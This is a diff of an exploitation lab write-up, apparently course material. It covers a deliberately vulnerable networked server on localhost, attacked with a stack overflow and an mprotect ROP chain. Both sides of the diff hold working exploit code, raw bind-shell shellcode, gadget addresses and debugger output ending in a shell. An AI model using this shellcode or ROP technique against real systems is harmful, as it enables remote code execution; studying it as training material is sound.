@@ -1,162 +1,58 @@
 # Remote buffer overflow with ROP - DEP/64bit
 
+## Introduction
+
 Networked server with a stack based overflow. Can be solved by using ROP
 and `mprotect()` to make shellcode executable.
 
 ## Source
 
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <netdb.h>
-#include <netinet/in.h>
-#include <string.h>
-#include <unistd.h>
-#include <crypt.h>
+* Source directory: `~/challenges/challenge16/`
+* Source files: [challenge16](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge16)
 
+You can compile it by calling `make` in the folder `~/challenges/challenge16`
 
-void write2sock(int sock, char *str) {
-        write(sock, str, strlen(str));
+### Vulnerability
+
+The vulnerability lies here:
+
+```c
+void handleClient (int socket) {
+   char data[1024];
+   int ret = 0;
+
+   bzero(data, sizeof(data));
+   write(socket, "Data: ", 6);
+
+   ret = read(socket, data, 2048); // reads up to 2048 bytes into a 1024 buffer
+   printf("I've read %i bytes\n", ret);
 }
+```
+
+The server reads up to 2048 bytes into a 1024 buffer directly from the socket. The socket itself will communicate
+when there is no more data, therefore null bytes are allowed.
 
 
-void readStrInput(int sock, int len) {
-        char buffer[128];
-        ssize_t ret;
+## Usage
 
-        bzero(buffer, sizeof(buffer));
+Start the server in a terminal:
+```
+~/challenges/challenge16$ ./challenge16
+Starting server on port: 5001
+Client connected
+I've read 5 bytes
+```
 
-        dprintf(sock, "Input string: \n");
-        dprintf(sock, "> ");
-        fflush(stdout);
-        ret = read(sock, &buffer, len);
+In another terminal:
+```
+~/challenges/challenge16$ nc localhost 5001
+Data: Test
 
-        dprintf(sock, "I've read: %i bytes\n", ret);
-}
-
-
-void handleBofInput(int sock) {
-        char input[16];
-        int inputLen;
-
-        dprintf(sock, "How many bytes do you want to read?\n");
-        dprintf(sock, "> ");
-
-        read(sock, input, sizeof(input) - 1);
-        inputLen = atoi(input);
-
-        if (inputLen > 0) {
-                dprintf(sock, "Ok, i'll read %i bytes\n", inputLen);
-                readStrInput(sock, inputLen);
-        }
-
-        dprintf(sock, "Ok, done\n");
-}
-[...]
+~/challenges/challenge16$
 ```
 
 
-## Step 1: Check program behaviour
-
-Start server, and note pid:
-```
-root@hlUbuntu64:~/challenges/challenge16# ./challenge16 &
-[1] 5880
-root@hlUbuntu64:~/challenges/challenge16# Listen on port: 5001
-```
-
-You can use the pid `5880` to later attach to the process in GDB via `attach 5880`.
-
-
-```
-root@hlUbuntu64:~/challenges/challenge16# nc localhost 5001
-Press:
-  0   To quit
-  1   To stack overflow
-> 1
-How many bytes do you want to read?
-> 4
-Ok, i'll read 4 bytes
-Input string:
-> AAAA
-I've read: 4 bytes
-Ok, done
-```
-
-## Step 2: basic exploit skeleton
-
-```
-#!/usr/bin/python
-
-import struct
-from pwn import *
-
-# http://shell-storm.org/shellcode/files/shellcode-78.php
-shellcode = ""
-shellcode += "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2"
-shellcode += "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c"
-shellcode += "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05"
-shellcode += "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89"
-shellcode += "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f"
-shellcode += "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21"
-shellcode += "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
-shellcode += "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89"
-shellcode += "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05";
-
-
-e = ELF("./challenge16")
-tube = connect("localhost", 5001)
-
-def doBof():
-        print tube.recvuntil(">")
-        tube.sendline("1");
-
-        print tube.recv()
-        tube.sendline("8");
-
-        print tube.recv()
-        tube.sendline("AAAAAAAA")
-
-        print tube.recv()
-
-
-doBof()
-```
-
-
-## Step 3: Find offset
-
-With trial and error, we find the correct offset to SIP: `152`
-
-```
-offset = 152
-
-def doBof(payload):
-        print tube.recvuntil("> ")
-        tube.send("1");
-
-        print tube.recv()
-        tube.send(str(len(payload)));
-
-        print tube.recv()
-        tube.send(payload)
-
-        print tube.recv()
-
-
-payload = "A" * offset + "BBBB"
-
-doBof(payload)
-```
-
-Test results in:
-```
-0x0000000042424242 in ?? ()
-gdb-peda$
-```
-
-
-## Plan
+## Exploit
 
 Because DEP is enabled, we have to mark the memory area of the stack executable. This is
 possible by using the systemcall `mprotect`:
@@ -169,8 +65,15 @@ mprotect() changes the access protections for the calling process's
        [addr, addr+len-1].  addr must be aligned to a page boundary.
 ```
 
+So we will call `mprotect` syscall via ROP first, then invoke our now executable shellcode.
+As we disabled ASLR, the stack and therefore our shellcode will be at a static address.
 
-## Example mprotect
+
+## Example mprotect()
+
+Lets write a C program to test `mprotect()` from libc first. 
+
+Important is that the address needs to be page aligned. We can do this with `addr & ~(4096 - 1)`.
 
 ```
 #include <stdio.h>
@@ -218,86 +121,16 @@ x86-64 bit system call convention is: RDI, RSI, RDX (syscall in RAX).
 
 We'll do the following ROP chain:
 
-- pop RAX   // <-- SIP is here
-- 0x7d      // sys_mprotect
-- pop RDI
-- addr      // addr of stack with shellcode
-- pop RSI
-- 4096      // size of stack
-- pop RDX
-- 0x7       // stack permissions (RWX)
-- syscall
-- addr of shellcode
-
-
-## Find stack addr of shellcode
-
-First, lets find the shellcode address:
-
-```
-gdb-peda$ disas readStrInput
-Dump of assembler code for function readStrInput:
-   0x0000000000400a68 <+0>:	push   rbp
-   0x0000000000400a69 <+1>:	mov    rbp,rsp
-   0x0000000000400a6c <+4>:	sub    rsp,0xa0
-   0x0000000000400a73 <+11>:	mov    DWORD PTR [rbp-0x94],edi
-   0x0000000000400a79 <+17>:	mov    DWORD PTR [rbp-0x98],esi
-   0x0000000000400a7f <+23>:	lea    rax,[rbp-0x90]
-   0x0000000000400a86 <+30>:	mov    esi,0x80
-   0x0000000000400a8b <+35>:	mov    rdi,rax
-   0x0000000000400a8e <+38>:	call   0x4008d0 <bzero@plt>
-   0x0000000000400a93 <+43>:	mov    eax,DWORD PTR [rbp-0x94]
-   0x0000000000400a99 <+49>:	mov    esi,0x400ea8
-   0x0000000000400a9e <+54>:	mov    edi,eax
-   0x0000000000400aa0 <+56>:	mov    eax,0x0
-   0x0000000000400aa5 <+61>:	call   0x400860 <dprintf@plt>
-   0x0000000000400aaa <+66>:	mov    eax,DWORD PTR [rbp-0x94]
-   0x0000000000400ab0 <+72>:	mov    esi,0x400eb8
-   0x0000000000400ab5 <+77>:	mov    edi,eax
-   0x0000000000400ab7 <+79>:	mov    eax,0x0
-   0x0000000000400abc <+84>:	call   0x400860 <dprintf@plt>
-   0x0000000000400ac1 <+89>:	mov    rax,QWORD PTR [rip+0x2015f8]        # 0x6020c0 <stdout@@GLIBC_2.2.5>
-   0x0000000000400ac8 <+96>:	mov    rdi,rax
-   0x0000000000400acb <+99>:	call   0x400890 <fflush@plt>
-   0x0000000000400ad0 <+104>:	mov    eax,DWORD PTR [rbp-0x98]
-   0x0000000000400ad6 <+110>:	movsxd rdx,eax
-   0x0000000000400ad9 <+113>:	lea    rcx,[rbp-0x90]
-   0x0000000000400ae0 <+120>:	mov    eax,DWORD PTR [rbp-0x94]
-   0x0000000000400ae6 <+126>:	mov    rsi,rcx
-   0x0000000000400ae9 <+129>:	mov    edi,eax
-   0x0000000000400aeb <+131>:	call   0x400870 <read@plt>
-   0x0000000000400af0 <+136>:	mov    QWORD PTR [rbp-0x8],rax
-   0x0000000000400af4 <+140>:	mov    rdx,QWORD PTR [rbp-0x8]
-   0x0000000000400af8 <+144>:	mov    eax,DWORD PTR [rbp-0x94]
-   0x0000000000400afe <+150>:	mov    esi,0x400ebb
-   0x0000000000400b03 <+155>:	mov    edi,eax
-   0x0000000000400b05 <+157>:	mov    eax,0x0
-   0x0000000000400b0a <+162>:	call   0x400860 <dprintf@plt>
-   0x0000000000400b0f <+167>:	nop
-   0x0000000000400b10 <+168>:	leave
-   0x0000000000400b11 <+169>:	ret
-End of assembler dump.
-gdb-peda$ b *readStrInput+131
-Breakpoint 1 at 0x400aeb
-gdb-peda$ i r rsi
-rsi            0x7fffffffe1e0	0x7fffffffe1e0
-gdb-peda$ x/16x $rsi
-0x7fffffffe1e0:	0x0000000000000000	0x0000000000000000
-0x7fffffffe1f0:	0x0000000000000000	0x0000000000000000
-0x7fffffffe200:	0x0000000000000000	0x0000000000000000
-0x7fffffffe210:	0x0000000000000000	0x0000000000000000
-0x7fffffffe220:	0x0000000000000000	0x0000000000000000
-0x7fffffffe230:	0x0000000000000000	0x0000000000000000
-0x7fffffffe240:	0x0000000000000000	0x0000000000000000
-0x7fffffffe250:	0x0000000000000000	0x0000000000000000
-gdb-peda$ n
-0x0000000000400af0 in readStrInput ()
-gdb-peda$ x/16x $rsi
-0x7fffffffe1e0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
-0x7fffffffe1e8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
-```
-
-Therefore, our stack address is `0x7fffffffe1e0`
+- pop RAX; ret      // <-- SIP is here
+- 0x7d              // rax = sys_mprotect
+- pop RDI; ret
+- addr              // rdi = addr of stack with shellcode
+- pop RSI; ret
+- 4096              // rsi = size of stack
+- pop RDX; ret
+- 0x7               // rdp = stack permissions (RWX)
+- syscall; ret      // invoke syscall
+- addr of shellcode // will invoke our shellcode
 
 
 ## Find gadgets
@@ -309,152 +142,226 @@ We need five gadgets:
 - pop RDX
 - syscall
 
-Check libraries the binary uses:
-```
-root@hlUbuntu64:~/challenges/challenge16# ldd challenge16
-	linux-vdso.so.1 =>  (0x00007ffff7ffd000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c2b000)
-	/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
-```
-
-Check libc for gadgets:
-```
-root@hlUbuntu64:~/challenges/challenge16# ropper
-(ropper)> type rop
-(ropper)> file /lib/x86_64-linux-gnu/libc.so.6
-[INFO] Load gadgets for section: PHDR
-[LOAD] loading... 100%
-[INFO] Load gadgets for section: LOAD
-[LOAD] loading... 100%
-[LOAD] removing double gadgets... 100%
-[INFO] File loaded.
-
-(libc.so.6/ELF/x86_64)> search /1/ pop rax
-[INFO] Searching for gadgets: pop rax
-
-[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
-0x0000000000018ec8: pop rax; ret 0x18;
-0x000000000003a718: pop rax; ret;
-
-(libc.so.6/ELF/x86_64)> search /1/ pop rdi
-[INFO] Searching for gadgets: pop rdi
-
-[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
-0x0000000000067449: pop rdi; ret 0xffff;
-0x00000000000f1c2b: pop rdi; ret 9;
-0x0000000000021102: pop rdi; ret;
-
-(libc.so.6/ELF/x86_64)> search /1/ pop rsi
-[INFO] Searching for gadgets: pop rsi
-
-[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
-0x00000000001014fb: pop rsi; ret 0xcdbb;
-0x00000000000202e8: pop rsi; ret;
-
-(libc.so.6/ELF/x86_64)> search /1/ pop rdx
-[INFO] Searching for gadgets: pop rdx
-
-[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
-0x0000000000001b92: pop rdx; ret;
-
-(libc.so.6/ELF/x86_64)> search /1/ syscall
-[INFO] Searching for gadgets: syscall
-
-[INFO] File: /lib/x86_64-linux-gnu/libc.so.6
-0x00000000000bb945: syscall; ret;
+Pwntools can help us find them. See `print-gadgets.py`:
 
 ```
-
-We'll take the following gadgets:
-* 0x000000000003a718: pop rax; ret;
-* 0x0000000000021102: pop rdi; ret;
-* 0x00000000000202e8: pop rsi; ret;
-* 0x0000000000001b92: pop rdx; ret;
-* 0x00000000000bb945: syscall; ret;
-
-Lets check where libc is mapped into:
-```
-gdb-peda$ vmmap
-Start              End                Perm	Name
-0x00400000         0x00402000         r-xp	/root/challenges/challenge16/challenge16
-0x00601000         0x00602000         r--p	/root/challenges/challenge16/challenge16
-0x00602000         0x00603000         rw-p	/root/challenges/challenge16/challenge16
-0x00603000         0x00624000         rw-p	[heap]
-0x00007ffff7a0e000 0x00007ffff7bce000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
-[...]
-```
-
-The libc base address is `0x00007ffff7a0e000`.
-
-Lets double check it with a gadget:
-```
-gdb-peda$ x/2i 0x00007ffff7a0e000+0x000000000003a718
-   0x7ffff7a48718 <mblen+104>:	pop    rax
-   0x7ffff7a48719 <mblen+105>:	ret
-```
-
-Seems alright!
-
-## Updated exploit
-
-We use the following ROP chain:
-```
-# shellcode
-payload = shellcode
-payload += "A" * (offset - len(shellcode))
-
-# rop
-payload += p64 ( libcBase + 0x000000000003a718 )        # 0x000000000003a718: pop rax; ret;
-payload += p64 ( 10 )                   # syscall sys_mprotect
-
-payload += p64 ( libcBase + 0x0000000000021102 )        # 0x0000000000021102: pop rdi; ret;
-payload += p64 ( stackAddr )            # mprotect arg: addr
-
-payload += p64 ( libcBase + 0x00000000000202e8 )        # 0x00000000000202e8: pop rsi; ret;
-payload += p64 ( 4096 )                 # mprotect arg: size
-
-payload += p64 ( libcBase + 0x0000000000001b92)         # 0x0000000000001b92: pop rdx; ret;
-payload += p64 ( 0x7 )                  # protect arg: permissions
-
-payload += p64 ( libcBase + 0x00000000000bb945) # 0x00000000000bb945: syscall; ret;
-
-payload += p64 ( shellcodeAddr )
+~/challenges/challenge16$ ./print-gadgets.py challenge16
+...
+ 4554474: Gadget(0x457eea, ['add rsp, 0x98', 'ret'], [], 0xa0),
+ 4554475: Gadget(0x457eeb, ['add esp, 0x98', 'ret'], [], 0xa0),
+ 4559101: Gadget(0x4590fd, ['add rsp, 0x38', 'ret'], [], 0x40),
+ 4559102: Gadget(0x4590fe, ['add esp, 0x38', 'ret'], [], 0x40),
+ 4581157: Gadget(0x45e725, ['add esp, 0x18', 'pop rbx', 'pop rbp', 'pop r12', 'pop r13', 'ret'], ['rbx', 'rbp', 'r12', 'r13'], 0x40),
+ 4619734: Gadget(0x467dd6, ['add esp, 0x68', 'pop rbx', 'pop rbp', 'pop r12', 'pop r13', 'ret'], ['rbx', 'rbp', 'r12', 'r13'], 0x90),
+ 4622845: Gadget(0x4689fd, ['add rsp, 8', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0x20),
+ 4622846: Gadget(0x4689fe, ['add esp, 8', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0x20),
+ 4623262: Gadget(0x468b9e, ['add esp, 0xa8', 'pop rbp', 'pop r12', 'ret'], ['rbp', 'r12'], 0xc0),
+ 4668502: Gadget(0x473c56, ['pop rax', 'pop rdx', 'pop rbx', 'ret'], ['rax', 'rdx', 'rbx'], 0x20),
+ 4668503: Gadget(0x473c57, ['pop rdx', 'pop rbx', 'ret'], ['rdx', 'rbx'], 0x18),
+ 4668973: Gadget(0x473e2d, ['add rsp, 0x48', 'ret'], [], 0x50),
+ 4668974: Gadget(0x473e2e, ['add esp, 0x48', 'ret'], [], 0x50),
+ 4669856: Gadget(0x4741a0, ['add rsp, 0x30', 'pop rbp', 'ret'], ['rbp'], 0x40),
+ 4669857: Gadget(0x4741a1, ['add esp, 0x30', 'pop rbp', 'ret'], ['rbp'], 0x40),
+ 4676136: Gadget(0x475a28, ['pop rbp', 'pop rbx', 'ret'], ['rbp', 'rbx'], 0x18),
+ 4702008: Gadget(0x47bf38, ['add rsp, 0x38', 'pop rbx', 'pop r14', 'ret'], ['rbx', 'r14'], 0x50),
+ 4702009: Gadget(0x47bf39, ['add esp, 0x38', 'pop rbx', 'pop r14', 'ret'], ['rbx', 'r14'], 0x50),
+ 4702012: Gadget(0x47bf3c, ['pop rbx', 'pop r14', 'ret'], ['rbx', 'r14'], 0x18)}
+Useful gadgets:
+Gadget(0x446ef3, ['pop rax', 'ret'], ['rax'], 0x10)
+Gadget(0x40178e, ['pop rdi', 'ret'], ['rdi'], 0x10)
+Gadget(0x4078be, ['pop rsi', 'ret'], ['rsi'], 0x10)
+Gadget(0x4016ab, ['pop rdx', 'ret'], ['rdx'], 0x10)
 ```
 
-## Result
+```
+/challenges/challenge16$ python3 print-gadgets.py challenge16 | grep syscall
+ 4198923: Gadget(0x40120b, ['syscall'], [], 0x0),
+ 4280524: Gadget(0x4150cc, ['syscall', 'ret'], [], 0x8),
+ 4302646: Gadget(0x41a736, ['syscall', 'pop rbp', 'ret'], ['rbp'], 0x10),
+ 4311454: Gadget(0x41c99e, ['syscall', 'pop rbx', 'ret'], ['rbx'], 0x10),
+```
+
+So the addresses are as follows:
+* 0x446ef3: pop rax; ret
+* 0x40178e: pop rdi; ret
+* 0x4078be: pop rsi; ret
+* 0x4016ab: pop rdx; ret
+* 0x4150cc: syscall
+
+Note: `rop.syscall` will return the first one at `0x40120b`, which does not have a ret. 
+
+To build the ropchain, we can just put the addresses of the gadgets at the end
+of our exploit data:
 
 ```
-root@hlUbuntu64:~/challenges/challenge16# python exp-challenge16.py
-[*] '/root/challenges/challenge16/challenge16'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE
-[+] Opening connection to localhost on port 5001: Done
-Shellcode len: 131
-Stack addr: 0x7fffffffe000
-Shellcode:  0x7fffffffe1e0
-Press:
-  0   To quit
-  1   To stack overflow
->
-How many bytes do you want to read?
+def makeExploit(offset, address, buf_size=128, nop=b'\x90'):
+    alignedAddr = (address & ~(4096-1));
 
->
-Ok, i'll read 232 bytes
-Input string:
->
-[+] Opening connection to localhost on port 4444: Done
+    exploit = nop * (buf_size - len(shellcode))
+    exploit += shellcode
+    exploit += b'A' * (offset - len(exploit))
+
+    # next 8 bytes in exploit point on SIP
+
+    exploit += p64 ( 0x446ef3 )         # 0x446ef3: pop rax; ret;
+    exploit += p64 ( 10 )               # syscall sys_mprotect
+
+    exploit += p64 ( 0x40178e )         # 0x40178e: pop rdi; ret;
+    exploit += p64 ( alignedAddr )      # mprotect arg: addr
+
+    exploit += p64 ( 0x4078be )         # 0x4078be: pop rsi; ret;
+    exploit += p64 ( 4096 )             # mprotect arg: size
+
+    exploit += p64 ( 0x4016ab )         # 0x4016ab: pop rdx; ret;
+    exploit += p64 ( 0x7 )              # protect arg: permissions
+
+    exploit += p64 ( 0x4150cc )         # 0x40120b: syscall; ret
+
+    exploit += p64 ( address )  # continue here, at shellcode
+
+    return exploit
+```
+
+
+## Offset
+
+Offset is `1048`:
+
+```
+~/challenges/challenge16$ python3 exp-challenge16.py --offset 1048
+...
+
+000003d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000003e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000003f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000400  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000410  41 41 41 41  41 41 41 41  42 42 42 42               │AAAA│AAAA│BBBB│
+0000041c
+[ ] Receiving all data: 0B
+
+─────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x15
+$rbx   : 0x00000000400488  →   add BYTE PTR [rax], al
+$rcx   : 0x0
+$rdx   : 0x0
+$rsp   : 0x007fffffffeb70  →  0x007fffffffece8  →  0x007fffffffeedc  →  "./challenge16"
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x000000004b4600  →  "I've read 1052 bytes\nrt: 5001\n"
+$rdi   : 0x000000004b1250  →  0x0000000000000000
+$rip   : 0x42424242
+───────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+───────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge16", stopped 0x42424242 in ?? (), reason: SIGSEGV
+──────────────────────────────────────────────────────────────────────────────────────────
+```
+
+
+## Find stack addr of shellcode
+
+To find the stack address of the shellcode in memory, we can start the exploit with the
+parameters `--addr 0x414141 --keep --gdb "b *handleClient+129"`. This will the `gdb` argument
+will set a breakpoint at the end of the overflown function, and we can just simply print
+the memory address with the gdb command `print &data`:
+
+Remember:
+```
+void handleClient (int socket) {
+   char data[1024];
+   int ret = 0;
+
+   bzero(data, sizeof(data));
+   write(socket, "Data: ", 6);
+
+   ret = read(socket, data, 2048); // reads up to 2048 bytes into a 1024 buffer
+   printf("I've read %i bytes\n", ret);
+}
+```
+
+Find address:
+```
+~/challenges/challenge16$ python3 exp-challenge16.py --offset 1048 --addr 0x414141 --keep --gdb "b *handleClient+129"
+...
+────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x15
+$rbx   : 0x00000000400488  →   add BYTE PTR [rax], al
+$rcx   : 0x0
+$rdx   : 0x0
+$rsp   : 0x007fffffffeb68  →  0x00000000446ef3  →  <__open_nocancel+99> pop rax
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x000000004b4600  →  "I've read 1128 bytes\nrt: 5001\n"
+$rdi   : 0x000000004b1250  →  0x0000000000000000
+$rip   : 0x00000000401d0e  →  <handleClient+129> ret
+───────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x401d0d <handleClient+128> leave
+ →   0x401d0e <handleClient+129> ret
+   ↳    0x446ef3 <__open_nocancel+99> pop    rax
+        0x446ef4 <__open_nocancel+100> ret
+        0x446ef5 <__open_nocancel+101> nop    DWORD PTR [rax]
+        0x446ef8 <__open_nocancel+104> lea    rax, [rsp+0x60]
+───────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge16", stopped 0x401d0e in handleClient (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────
+gef➤  print &data
+$1 = (char (*)[1024]) 0x7fffffffe750
+```
+
+The address of our buffer/shellcode is therefore `0x7fffffffe750`.
+
+
+## Putting it all together
+
+We use the command line `exp-challenge16.py --offset 1048 --addr 0x7fffffffe750`. 
+
+If it succeeds, we will see something like `process 1484 is executing new program: /usr/bin/dash`
+in the bottom screen. The top screen will show `[+] Opening connection to 127.0.0.1 on port 4444: Done`
+and a shell prompt. You can select it by changing into that screen with `ctrl-b <up-arrow>`.
+
+```
+~/challenges/challenge16$ python3 exp-challenge16.py --offset 1048 --addr 0x7fffffffe750 
+...
+000003d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000003e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000003f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000400  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000410  41 41 41 41  41 41 41 41  f3 6e 44 00  00 00 00 00  │AAAA│AAAA│·nD·│····│
+00000420  0a 00 00 00  00 00 00 00  8e 17 40 00  00 00 00 00  │····│····│··@·│····│
+00000430  00 e0 ff ff  ff 7f 00 00  be 78 40 00  00 00 00 00  │····│····│·x@·│····│
+00000440  00 10 00 00  00 00 00 00  ab 16 40 00  00 00 00 00  │····│····│··@·│····│
+00000450  07 00 00 00  00 00 00 00  cc 50 41 00  00 00 00 00  │····│····│·PA·│····│
+00000460  50 e7 ff ff  ff 7f 00 00                            │P···│····│
+00000468
+[+] Opening connection to 127.0.0.1 on port 4444: Done
 [*] Switching to interactive mode
-$ ls
-Makefile
-a.out
-challenge16
-challenge16.c
-exp-challenge16.py
-mprotect
-mprotect-test.c
-peda-session-challenge16.txt
-peda-session-dash.txt
+$
+──────────────────────────────────────────────────────────────────────────────────────────
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0xfffffffffffffe00
+$rbx   : 0x00000000400488  →   add BYTE PTR [rax], al
+$rcx   : 0x000000004462de  →  0x5a77fffff0003d48 ("H="?)
+$rdx   : 0x800
+$rsp   : 0x007fffffffe738  →  0x00000000401cf5  →  <handleClient+104> mov DWORD PTR [rbp-0x4], eax
+$rbp   : 0x007fffffffeb60  →  0x007fffffffebb0  →  0x00000000402cc0  →  <__libc_csu_init+0> push r15
+$rsi   : 0x007fffffffe750  →  0x0000000000000000
+$rdi   : 0x4
+$rip   : 0x000000004462de  →  0x5a77fffff0003d48 ("H="?)
+───────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x4462dc <read+12>        syscall
+ →   0x4462de <read+14>        cmp    rax, 0xfffffffffffff000
+     0x4462e4 <read+20>        ja     0x446340 <read+112>
+     0x4462e6 <read+22>        ret
+     0x4462e7 <read+23>        nop    WORD PTR [rax+rax*1+0x0]
+───────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge16", stopped 0x4462de in read (), reason: STOPPED
+──────────────────────────────────────────────────────────────────────────────────────────
+process 1484 is executing new program: /usr/bin/dash
 ```
+
+## Debugging help
+
+
